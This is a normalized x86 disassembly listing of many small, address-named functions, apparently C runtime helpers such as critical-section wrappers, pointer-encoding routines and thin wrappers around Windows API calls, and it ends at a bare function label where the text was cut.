sub_42830f
mov eax r--data
retn
sub_428315
mov eax r--data
retn
sub_42831b
mov eax r--data
retn
sub_428321
mov eax r--data
retn
sub_428327
mov eax r--data
retn
sub_42832d
mov eax r--data
retn
sub_428333
mov eax r--data
retn
sub_428339
mov eax r--data
retn
sub_428db3
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
movzx ecx [ ebp + 0x8 ]
mov eax [ eax ]
mov eax [ eax ]
movzx eax [ eax + ecx * 2 ]
and eax 0x8000
pop ebp
retn
sub_428dce
mov ecx [ rw-data ]
xor eax eax
test ecx ecx
setne al
retn
sub_4293ae
mov edi edi
push ebp
mov ebp esp
pop ebp
jmp sub_429240
sub_4293b9
mov edi edi
push ebp
mov ebp esp
pop ebp
jmp sub_4292bb
sub_4293d0
mov edx r--data
jmp sub_435b37
sub_4293da
mov edx r--data
jmp sub_435ab0
sub_429880
mov eax [ rw-data ]
and eax 0x1f
push 0x20
pop ecx
sub ecx eax
xor eax eax
ror eax cl
xor eax [ rw-data ]
retn
sub_429898
mov edi edi
push ebp
mov ebp esp
mov eax [ rw-data ]
mov ecx eax
xor eax [ ebp + 0x8 ]
and ecx 0x1f
ror eax cl
pop ebp
retn
sub_4298cd
mov eax [ rw-data ]
and eax 0x1f
push 0x20
pop ecx
sub ecx eax
xor eax eax
ror eax cl
xor eax [ rw-data ]
push eax
call sub_4299cd
pop ecx
retn
sub_4298ec
xor eax eax
retn
sub_429920
mov eax ecx
retn
sub_429923
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x8 ]
mov ecx rw-data
call sub_4298ef
pop ebp
retn
sub_4299c4
push 0x0
call sub_42f0c3
pop ecx
retn
sub_429a24
push 0x0
call sub_42f0c3
pop ecx
retn
sub_429a2d
mov edi edi
push ebp
mov ebp esp
pop ebp
jmp sub_42d3eb
sub_429bef
xor al al
retn
sub_429dd0
mov eax [ rw-data ]
retn
sub_429dd6
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ rw-data ] eax
pop ebp
retn
sub_429de5
mov edi edi
push ebp
mov ebp esp
mov eax [ rw-data ]
mov ecx eax
xor eax [ ebp + 0x8 ]
and ecx 0x1f
ror eax cl
pop ebp
retn
sub_429e4b
mov eax ecx
retn
sub_429e4e
mov eax [ rw-data ]
mov ecx eax
xor eax [ rw-data ]
and ecx 0x1f
ror eax cl
neg eax
sbb eax eax
neg eax
retn
sub_429e67
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x8 ]
mov ecx rw-data
call sub_429e1a
pop ebp
retn
sub_429ec4
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call sub_429dfb
pop ecx
mov [ rw-data ] eax
pop ebp
retn
sub_429ed9
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call sub_42d3b1
pop ecx
pop ebp
retn 0x4
sub_429eeb
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call sub_42d3b1
pop ecx
pop ebp
retn 0x4
sub_429efd
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call sub_42d3b1
pop ecx
pop ebp
retn 0x4
sub_42a152
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x10 ]
push [ eax ]
mov eax [ ebp + 0x8 ]
push [ ebp + 0xc ]
push [ eax ]
call [ GetModuleFileNameA@IAT ]
pop ebp
retn
sub_42a16c
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x10 ]
push [ eax ]
mov eax [ ebp + 0x8 ]
push [ ebp + 0xc ]
push [ eax ]
call [ GetModuleFileNameW@IAT ]
pop ebp
retn
sub_42a481
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
mov [ rw-data ] eax
pop ebp
retn
sub_42a492
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
mov [ rw-data ] eax
pop ebp
retn
sub_42a4a3
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ ecx ] eax
mov eax ecx
pop ebp
retn 0x4
sub_42a4b3
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ ecx ] eax
mov eax ecx
pop ebp
retn 0x4
sub_42a4c3
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ ecx ] eax
mov eax ecx
pop ebp
retn 0x4
sub_42a4d3
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ ecx ] eax
mov eax ecx
pop ebp
retn 0x4
sub_42a4e3
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ ecx ] eax
mov eax ecx
pop ebp
retn 0x4
sub_42a4f3
mov edi edi
push esi
mov esi ecx
push [ esi ]
call sub_42d3b1
and [ esi ] 0x0
pop ecx
pop esi
retn
sub_42a505
mov edi edi
push esi
mov esi ecx
push [ esi ]
call sub_42d3b1
and [ esi ] 0x0
pop ecx
pop esi
retn
sub_42a517
mov edi edi
push esi
mov esi ecx
push [ esi ]
call sub_42d3b1
and [ esi ] 0x0
pop ecx
pop esi
retn
sub_42a529
xor eax eax
cmp [ ecx ] eax
setne al
retn
sub_42a531
mov eax [ ecx ]
xor edx edx
mov ecx [ eax ]
cmp [ ecx ] edx
je r-xdata
mov eax edx
retn
lea ecx [ ecx + 0x4 ]
inc edx
cmp [ ecx ] 0x0
jne r-xdata
sub_42a547
mov eax [ ecx ]
xor edx edx
mov ecx [ eax ]
cmp [ ecx ] edx
je r-xdata
mov eax edx
retn
lea ecx [ ecx + 0x4 ]
inc edx
cmp [ ecx ] 0x0
jne r-xdata
sub_42a55d
mov eax [ ecx ]
and [ ecx ] 0x0
retn
sub_42a563
mov eax [ ecx ]
and [ ecx ] 0x0
retn
sub_42a569
mov eax [ ecx ]
and [ ecx ] 0x0
retn
j_sub_437a77#2
jmp sub_437a77
sub_42a574
retn
sub_42a575
mov edi edi
push ebp
mov ebp esp
pop ebp
jmp sub_437541
sub_42a580
mov edi edi
push ebp
mov ebp esp
pop ebp
jmp sub_43754c
sub_42a58b
mov eax [ ecx ]
retn
sub_42a58e
mov eax [ ecx ]
retn
sub_42a591
mov eax [ ecx ]
retn
sub_42a594
mov eax ecx
retn
sub_42a597
mov eax ecx
retn
sub_42a59a
mov eax rw-data
retn
sub_42a5a0
mov eax rw-data
retn
sub_42a5a6
mov eax [ rw-data ]
retn
sub_42a5ac
mov eax [ rw-data ]
retn
sub_42a5b2
xor eax eax
cmp [ ecx ] eax
setne al
retn
sub_42a5ba
mov edi edi
push esi
mov esi ecx
push [ esi ]
call sub_42d3b1
and [ esi ] 0x0
pop ecx
pop esi
retn
sub_42a5cc
mov edi edi
push esi
mov esi ecx
push [ esi ]
call sub_42d3b1
and [ esi ] 0x0
pop ecx
pop esi
retn
sub_42a5de
mov edi edi
push esi
mov esi ecx
push [ esi ]
call sub_42d3b1
and [ esi ] 0x0
pop ecx
pop esi
retn
sub_42a5f0
mov edi edi
push ebp
mov ebp esp
movsx eax [ ebp + 0x8 ]
push eax
call sub_43803a
neg eax
pop ecx
sbb eax eax
neg eax
pop ebp
retn
sub_42a608
xor al al
retn
sub_42a660
mov edi edi
push ebp
mov ebp esp
pop ebp
jmp sub_429f0f
sub_42a66b
mov edi edi
push ebp
mov ebp esp
pop ebp
jmp sub_42a033
sub_42a676
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ rw-data ] eax
pop ebp
retn
sub_42a685
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ rw-data ] eax
pop ebp
retn
sub_42a694
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call sub_42d3b1
pop ecx
pop ebp
retn 0x4
sub_42a6a6
mov eax [ rw-data ]
test eax eax
jne r-xdata
retn
call sub_42a6ce
mov [ rw-data ] eax
sub_42a6ba
mov eax [ rw-data ]
test eax eax
jne r-xdata
retn
call sub_42a6fd
mov [ rw-data ] eax
j_sub_438249
jmp sub_438249
j_sub_4382cc
jmp sub_4382cc
sub_42ab7f
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
push [ eax ]
mov eax [ ebp + 0x8 ]
push [ eax ]
call sub_438b42
pop ecx
pop ecx
pop ebp
retn
sub_42ab97
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
push [ eax ]
mov eax [ ebp + 0x8 ]
push [ eax ]
call sub_438b4d
pop ecx
pop ecx
pop ebp
retn
sub_42aca1
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
cmp eax [ rw-data ]
je r-xdata
pop ebp
retn
push eax
call sub_42aa1f
pop ecx
sub_42acbc
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
cmp eax [ rw-data ]
je r-xdata
pop ebp
retn
push eax
call sub_42aa4e
pop ecx
sub_42acd7
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ ecx ] eax
mov eax ecx
pop ebp
retn 0x4
sub_42ace7
mov edi edi
push esi
mov esi ecx
push [ esi ]
call sub_42d3b1
and [ esi ] 0x0
pop ecx
pop esi
retn
sub_42acf9
xor eax eax
cmp [ ecx ] eax
setne al
retn
sub_42ad01
xor eax eax
cmp [ ecx ] eax
setne al
retn
sub_42ad09
xor eax eax
cmp [ ecx ] eax
setne al
retn
sub_42ad47
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push 0xffffffff
push [ ebp + 0xc ]
push 0x0
push [ ebp + 0x8 ]
call [ MultiByteToWideChar@IAT ]
pop ebp
retn
sub_42ad84
mov eax [ ecx ]
and [ ecx ] 0x0
retn
sub_42ad8a
mov eax [ ecx ]
and [ ecx ] 0x0
retn
sub_42ad90
mov eax [ ecx ]
retn
sub_42ad93
mov eax rw-data
retn
sub_42ad99
mov eax rw-data
retn
sub_42ad9f
mov eax rw-data
retn
sub_42ada5
mov eax rw-data
retn
sub_42adab
mov eax rw-data
retn
sub_42adb1
mov eax rw-data
retn
sub_42ae19
xor eax eax
cmp [ ecx ] eax
setne al
retn
sub_42ae21
xor eax eax
cmp [ ecx ] eax
setne al
retn
sub_42ae29
xor eax eax
cmp [ ecx ] eax
setne al
retn
j_sub_437a77
jmp sub_437a77
sub_42ae36
retn
sub_42ae37
mov edi edi
push esi
mov esi ecx
push [ esi ]
call sub_42d3b1
and [ esi ] 0x0
pop ecx
pop esi
retn
sub_42ae49
mov eax ecx
retn
sub_42ae4c
mov eax ecx
retn
j_sub_42a6ce#2
jmp sub_42a6ce
j_sub_42a6fd#2
jmp sub_42a6fd
sub_42ae90
mov eax rw-data
retn
sub_42ae96
mov eax rw-data
retn
sub_42ae9c
mov eax [ rw-data ]
test eax eax
jne r-xdata
retn
call sub_42a6ce
mov [ rw-data ] eax
sub_42aeb0
mov eax [ rw-data ]
test eax eax
jne r-xdata
retn
call sub_42a6fd
mov [ rw-data ] eax
j_sub_42a72c
jmp sub_42a72c
j_sub_42a785
jmp sub_42a785
j_sub_437a77#3
jmp sub_437a77
sub_42af6c
retn
sub_42af6d
mov eax [ rw-data ]
retn
sub_42af73
mov eax [ rw-data ]
retn
sub_42af79
mov edi edi
push ebp
mov ebp esp
movsx eax [ ebp + 0x8 ]
push eax
call sub_43803a
neg eax
pop ecx
sbb eax eax
neg eax
pop ebp
retn
sub_42af91
xor al al
retn
sub_42b0ce
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
pop ebp
retn
sub_42b230
push esi
call sub_438db5
pop ecx
retn
sub_42b322
xor eax eax
retn
sub_42b325
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call sub_42d3b1
pop ecx
pop ebp
retn 0x4
sub_42b337
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call sub_42d3b1
pop ecx
pop ebp
retn 0x4
sub_42b349
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call sub_42d3b1
pop ecx
pop ebp
retn 0x4
sub_42b35b
push 0x8
push r--data
call sub_40d270
and [ ebp - 0x4 ] 0x0
mov ecx [ ebp + 0xc ]
call sub_42b680
mov [ ebp - 0x4 ] 0xfffffffe
call sub_42b387
call sub_40d2b6
retn 0xc
sub_42b387
mov eax [ ebp + 0x10 ]
mov eax [ eax ]
mov eax [ eax ]
and [ eax + 0x350 ] 0xffffffef
retn
sub_42b3d4
mov eax [ ebp + 0x10 ]
push [ eax ]
call sub_42f0c3
pop ecx
retn
sub_42b417
mov eax [ ebp + 0x10 ]
push [ eax ]
call sub_42f0c3
pop ecx
retn
sub_42b45f
mov eax [ ebp + 0x10 ]
push [ eax ]
call sub_42f0c3
pop ecx
retn
sub_42b4ff
retn
sub_42b500
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
mov [ ecx ] eax
mov eax ecx
pop ebp
retn 0x4
sub_42b512
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ ecx ] eax
mov eax ecx
pop ebp
retn 0x4
sub_42b54a
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
mov [ ecx ] eax
mov eax ecx
pop ebp
retn 0x4
sub_42b55c
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
mov [ ecx ] eax
mov eax ecx
pop ebp
retn 0x4
sub_42b56e
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ ecx ] eax
mov eax ecx
pop ebp
retn 0x4
sub_42b57e
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
mov [ ecx ] eax
mov eax ecx
pop ebp
retn 0x4
sub_42b590
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
mov [ ecx ] eax
mov eax ecx
pop ebp
retn 0x4
sub_42b5ca
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
mov [ ecx ] eax
mov eax ecx
pop ebp
retn 0x4
sub_42b5dc
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ ecx ] eax
mov eax ecx
pop ebp
retn 0x4
sub_42b5ec
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ ecx ] eax
mov eax ecx
pop ebp
retn 0x4
sub_42b5fc
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ ecx ] eax
mov eax ecx
pop ebp
retn 0x4
sub_42b60c
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ ecx ] eax
mov eax ecx
pop ebp
retn 0x4
sub_42b61c
mov edi edi
push esi
mov esi ecx
push [ esi ]
call sub_42d3b1
and [ esi ] 0x0
pop ecx
pop esi
retn
sub_42b62e
mov edi edi
push esi
mov esi ecx
push [ esi ]
call sub_42d3b1
and [ esi ] 0x0
pop ecx
pop esi
retn
sub_42b640
mov edi edi
push esi
mov esi ecx
push [ esi ]
call sub_42d3b1
and [ esi ] 0x0
pop ecx
pop esi
retn
sub_42b652
xor eax eax
cmp [ ecx ] eax
setne al
retn
sub_42b65a
xor eax eax
cmp [ ecx ] eax
setne al
retn
sub_42b662
xor eax eax
cmp [ ecx ] eax
setne al
retn
sub_42b66a
push [ ecx ]
call sub_42f0c3
pop ecx
retn
sub_42b673
mov eax [ ecx ]
mov eax [ eax ]
push [ eax ]
call sub_43a5c0
pop ecx
retn
sub_42b6dc
retn
sub_42b6dd
push [ ecx ]
call sub_42f07b
pop ecx
retn
sub_42b6e6
push [ ecx ]
call sub_42f0c3
pop ecx
retn
sub_42b6ef
mov eax [ ecx ]
mov eax [ eax ]
mov eax [ eax + 0x4 ]
[ eax ]
retn
sub_42b6fa
push [ ecx ]
call sub_42f07b
pop ecx
retn
sub_42b703
push [ ecx ]
call sub_42f07b
pop ecx
retn
sub_42b80a
push [ ecx ]
call sub_42f0c3
pop ecx
retn
sub_42b813
mov eax [ ecx ]
mov eax [ eax ]
and [ eax + 0x350 ] 0xffffffef
retn
sub_42b81f
mov eax [ ecx ]
and [ ecx ] 0x0
retn
sub_42b825
mov eax [ ecx ]
and [ ecx ] 0x0
retn
sub_42b82b
mov eax [ ecx ]
and [ ecx ] 0x0
retn
sub_42b831
mov eax [ ecx ]
retn
sub_42b834
mov eax [ ecx ]
retn
sub_42b837
mov eax [ ecx ]
retn
sub_42b83a
xor eax eax
cmp [ ecx ] eax
setne al
retn
sub_42b842
xor eax eax
cmp [ ecx ] eax
setne al
retn
sub_42b84a
xor eax eax
cmp [ ecx ] eax
setne al
retn
sub_42b852
mov edi edi
push esi
mov esi ecx
push [ esi ]
call sub_42d3b1
and [ esi ] 0x0
pop ecx
pop esi
retn
sub_42b864
mov edi edi
push esi
mov esi ecx
push [ esi ]
call sub_42d3b1
and [ esi ] 0x0
pop ecx
pop esi
retn
sub_42b876
mov edi edi
push esi
mov esi ecx
push [ esi ]
call sub_42d3b1
and [ esi ] 0x0
pop ecx
pop esi
retn
sub_42b888
mov eax ecx
retn
sub_42b8f1
xor eax eax
mov ecx rw-data
inc eax
xchg [ ecx ] eax
retn
sub_42b945
push 0x4
call sub_42f0c3
pop ecx
retn
sub_42bffc
push 0x5
call sub_42f0c3
pop ecx
retn
sub_42c008
push 0x4
call sub_42f0c3
pop ecx
retn
sub_42cac5
mov eax [ rw-data ]
retn
sub_42cafa
mov eax rw-data
retn
j_sub_42d3b1#3
jmp sub_42d3b1
sub_42cb05
mov eax [ rw-data ]
and eax 0x1f
push 0x20
pop ecx
sub ecx eax
xor eax eax
ror eax cl
xor eax [ rw-data ]
retn
sub_42cb1d
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call sub_42d3b1
pop ecx
pop ebp
retn 0x4
sub_42cb74
mov eax [ ebp + 0x10 ]
push [ eax ]
call sub_42f0c3
pop ecx
retn
sub_42cbc5
mov eax [ ebp + 0x10 ]
push [ eax ]
call sub_42f0c3
pop ecx
retn
sub_42cc40
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ ecx ] eax
mov eax ecx
pop ebp
retn 0x4
sub_42cc50
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
mov [ ecx ] eax
mov eax ecx
pop ebp
retn 0x4
sub_42cc62
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ ecx ] eax
mov eax [ ebp + 0xc ]
mov [ ecx + 0x4 ] eax
mov eax ecx
pop ebp
retn 0x8
sub_42cc78
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
mov [ ecx ] eax
mov eax ecx
pop ebp
retn 0x4
sub_42cc8a
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
mov [ ecx ] eax
mov eax ecx
pop ebp
retn 0x4
sub_42cc9c
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
mov [ ecx ] eax
mov eax ecx
pop ebp
retn 0x4
sub_42ccae
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ ecx ] eax
mov eax ecx
pop ebp
retn 0x4
sub_42ccbe
mov edi edi
push esi
mov esi ecx
push [ esi ]
call sub_42d3b1
and [ esi ] 0x0
pop ecx
pop esi
retn
sub_42cdf0
push [ ecx ]
call sub_42f0c3
pop ecx
retn
sub_42cf3a
push [ ecx ]
call sub_42f0c3
pop ecx
retn
sub_42cf43
push [ ecx ]
call sub_42f07b
pop ecx
retn
sub_42cf4c
push [ ecx ]
call sub_42f07b
pop ecx
retn
sub_42cf55
mov eax [ ecx ]
and [ ecx ] 0x0
retn
sub_42cf5b
mov edi edi
push esi
mov esi ecx
push [ esi ]
call sub_42d3b1
and [ esi ] 0x0
pop ecx
pop esi
retn
sub_42cf6d
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x8 ]
push rw-data
call sub_42cff3
pop ecx
pop ecx
pop ebp
retn
sub_42cf83
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x8 ]
push rw-data
call sub_42cff3
pop ecx
pop ecx
pop ebp
retn
sub_42d017
push rw-data
mov ecx rw-data
call sub_42d117
mov al 0x1
retn
sub_42d029
push rw-data
call sub_42cfb6
mov [ esp ] rw-data
call sub_42cfb6
pop ecx
mov al 0x1
retn
sub_42d043
mov al 0x1
retn
sub_42d046
mov al 0x1
retn
sub_42d049
call sub_42ae59
mov al 0x1
retn
sub_42d051
mov al 0x1
retn
sub_42d054
mov al 0x1
retn
sub_42d094
push 0x0
call sub_40e805
pop ecx
retn
sub_42d114
mov al 0x1
retn
sub_42d148
push r--data
push r--data
call sub_43bcbb
pop ecx
pop ecx
retn
sub_42d15a
call sub_430b02
test eax eax
setne al
retn
sub_42d165
call sub_430a52
mov al 0x1
retn
sub_42d16d
push r--data
push r--data
call sub_43bd3e
pop ecx
pop ecx
retn
sub_42d17f
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call sub_430bb3
pop ecx
mov al 0x1
pop ebp
retn
sub_42d1f0
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0xc ]
test eax eax
jne r-xdata
pop ebp
retn
mov eax sub_42d45a
sub_42d206
call sub_430a7e
mov eax [ eax + 0xc ]
test eax eax
jne r-xdata
retn
mov eax sub_42d45a
sub_42d260
xor eax eax
inc eax
retn
sub_42d328
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
xchg [ ecx ] eax
pop ebp
retn
sub_42d337
mov eax [ rw-data ]
retn
sub_42e83a
mov edx [ ecx + 0x4 ]
test edx edx
je r-xdata
retn
mov eax [ ecx ]
mov [ edx ] eax
sub_42e846
mov edx [ ecx + 0x4 ]
test edx edx
je r-xdata
retn
mov eax [ ecx ]
mov [ edx ] eax
sub_42e852
mov edx [ ecx ]
mov al [ edx ]
inc edx
mov [ ecx ] edx
retn
sub_42e85a
mov edx [ ecx ]
movzx eax [ edx ]
add edx 0x2
mov [ ecx ] edx
retn
sub_42e89d
mov eax 0x7fffffff
retn
sub_42e8a3
or eax 0xffffffff
mov edx 0x7fffffff
retn
sub_42e8ac
mov eax 0x80000000
retn
sub_42e8b2
xor eax eax
mov edx 0x80000000
retn
sub_42ead8
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ ecx ] eax
mov al 0x1
pop ebp
retn 0x4
sub_42eae8
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ ecx ] eax
mov al 0x1
pop ebp
retn 0x4
sub_42eaf8
mov eax [ ecx ]
retn
sub_42eafb
mov eax [ ecx ]
retn
sub_42eb52
cmp [ ecx ] 0x0
jne r-xdata
mov al 0x1
retn
call sub_430f56
mov [ eax ] 0x16
call sub_430e30
xor al al
retn
sub_42eb6d
cmp [ ecx ] 0x0
jne r-xdata
mov al 0x1
retn
call sub_430f56
mov [ eax ] 0x16
call sub_430e30
xor al al
retn
sub_42ed29
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
pop ebp
retn
sub_42f07b
mov edi edi
push ebp
mov ebp esp
imul eax [ ebp + 0x8 ] 0x18
add eax rw-data
push eax
call [ EnterCriticalSection@IAT ]
pop ebp
retn
sub_42f0c3
mov edi edi
push ebp
mov ebp esp
imul eax [ ebp + 0x8 ] 0x18
add eax rw-data
push eax
call [ LeaveCriticalSection@IAT ]
pop ebp
retn
sub_42f0da
push 0x4
call sub_42f07b
pop ecx
retn
sub_42f0e3
push 0x4
call sub_42f0c3
pop ecx
retn
sub_42f132
mov eax [ rw-data ]
and eax 0x1f
push 0x20
pop ecx
sub ecx eax
xor eax eax
ror eax cl
xor eax [ rw-data ]
retn
sub_42f1c2
mov ecx [ ebp + 0x10 ]
push [ ecx ]
call sub_42f0c3
pop ecx
retn
sub_42f1f6
mov edi edi
push ebp
mov ebp esp
mov eax [ rw-data ]
mov ecx eax
xor eax [ ebp + 0x8 ]
and ecx 0x1f
ror eax cl
pop ebp
retn
sub_42f22b
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
mov [ ecx ] eax
mov eax ecx
pop ebp
retn 0x4
sub_42f23d
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ ecx ] eax
mov eax ecx
pop ebp
retn 0x4
sub_42f24d
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
mov [ ecx ] eax
mov eax ecx
pop ebp
retn 0x4
sub_42f25f
mov eax sub_42f0ec
retn
sub_42f265
push [ ecx ]
call sub_42f07b
pop ecx
retn
sub_42f2a9
push [ ecx ]
call sub_42f0c3
pop ecx
retn
sub_42f2f2
or eax 0xffffffff
retn
sub_42f2f6
push r--data
push r--data
push r--data
push 0x0
call sub_42f65a
add esp 0x10
retn
sub_42f310
push r--data
push r--data
push r--data
push 0x1
call sub_42f65a
add esp 0x10
retn
sub_42f32a
push r--data
push r--data
push r--data
push 0x2
call sub_42f65a
add esp 0x10
retn
sub_42f344
push r--data
push r--data
push r--data
push 0x3
call sub_42f65a
add esp 0x10
retn
sub_42f35e
push r--data
push r--data
push r--data
push 0x4
call sub_42f65a
add esp 0x10
retn
sub_42f378
push r--data
push r--data
push r--data
push 0x5
call sub_42f65a
add esp 0x10
retn
sub_42f392
push r--data
push r--data
push r--data
push 0x6
call sub_42f65a
add esp 0x10
retn
sub_42f3ac
push r--data
push r--data
push r--data
push 0x7
call sub_42f65a
add esp 0x10
retn
sub_42f3c6
push r--data
push r--data
push r--data
push 0x8
call sub_42f65a
add esp 0x10
retn
sub_42f3e0
push r--data
push r--data
push r--data
push 0x9
call sub_42f65a
add esp 0x10
retn
sub_42f3fa
push r--data
push r--data
push r--data
push 0xa
call sub_42f65a
add esp 0x10
retn
sub_42f414
push r--data
push r--data
push r--data
push 0xb
call sub_42f65a
add esp 0x10
retn
sub_42f42e
push r--data
push r--data
push r--data
push 0xc
call sub_42f65a
add esp 0x10
retn
sub_42f448
push r--data
push r--data
push r--data
push 0xd
call sub_42f65a
add esp 0x10
retn
sub_42f462
push r--data
push r--data
push r--data
push 0xe
call sub_42f65a
add esp 0x10
retn
sub_42f47c
push r--data
push r--data
push r--data
push 0xf
call sub_42f65a
add esp 0x10
retn
sub_42f496
push r--data
push r--data
push r--data
push 0x10
call sub_42f65a
add esp 0x10
retn
sub_42f4b0
push r--data
push r--data
push r--data
push 0x11
call sub_42f65a
add esp 0x10
retn
sub_42f4ca
push r--data
push r--data
push r--data
push 0x12
call sub_42f65a
add esp 0x10
retn
sub_42f4e4
push r--data
push r--data
push r--data
push 0x13
call sub_42f65a
add esp 0x10
retn
sub_42f4fe
push r--data
push r--data
push r--data
push 0x14
call sub_42f65a
add esp 0x10
retn
sub_42f518
push r--data
push r--data
push r--data
push 0x15
call sub_42f65a
add esp 0x10
retn
sub_42f532
push r--data
push r--data
push r--data
push 0x17
call sub_42f65a
add esp 0x10
retn
sub_42f54c
push r--data
push r--data
push r--data
push 0x16
call sub_42f65a
add esp 0x10
retn
sub_42f566
push r--data
push r--data
push r--data
push 0x18
call sub_42f65a
add esp 0x10
retn
sub_42f580
push r--data
push r--data
push r--data
push 0x19
call sub_42f65a
add esp 0x10
retn
sub_42f59a
push r--data
push r--data
push r--data
push 0x1a
call sub_42f65a
add esp 0x10
retn
sub_42f5b4
push r--data
push r--data
push r--data
push 0x1b
call sub_42f65a
add esp 0x10
retn
sub_42f5ce
push r--data
push r--data
push r--data
push 0x1c
call sub_42f65a
add esp 0x10
retn
sub_42f5e8
push r--data
push r--data
push r--data
push 0x1d
call sub_42f65a
add esp 0x10
retn
sub_42f602
push r--data
push r--data
push r--data
push 0x1e
call sub_42f65a
add esp 0x10
retn
sub_42f61c
push r--data
push r--data
push r--data
push 0x1f
call sub_42f65a
add esp 0x10
retn
sub_4301b7
call sub_42f59a
test eax eax
je r-xdata
xor eax eax
retn
call sub_42f5b4
test eax eax
je r-xdata
xor eax eax
inc eax
retn
sub_4301d0
call sub_42f310
neg eax
sbb eax eax
neg eax
retn
sub_4301dc
call sub_42f580
neg eax
sbb eax eax
neg eax
retn
sub_4303f0
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call sub_42d3b1
pop ecx
pop ebp
retn 0x4
sub_430446
mov eax [ ebp + 0x10 ]
push [ eax ]
call sub_42f0c3
pop ecx
retn
sub_4304a7
mov eax [ ebp + 0x10 ]
push [ eax ]
call sub_42f0c3
pop ecx
retn
sub_4304f2
mov eax [ ebp + 0x10 ]
push [ eax ]
call sub_42f0c3
pop ecx
retn
sub_43053a
mov eax [ ebp + 0x10 ]
push [ eax ]
call sub_42f0c3
pop ecx
retn
sub_4305e6
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
mov [ ecx ] eax
mov eax ecx
pop ebp
retn 0x4
sub_4305f8
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
mov [ ecx ] eax
mov eax ecx
pop ebp
retn 0x4
sub_43060a
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
mov [ ecx ] eax
mov eax ecx
pop ebp
retn 0x4
sub_43061c
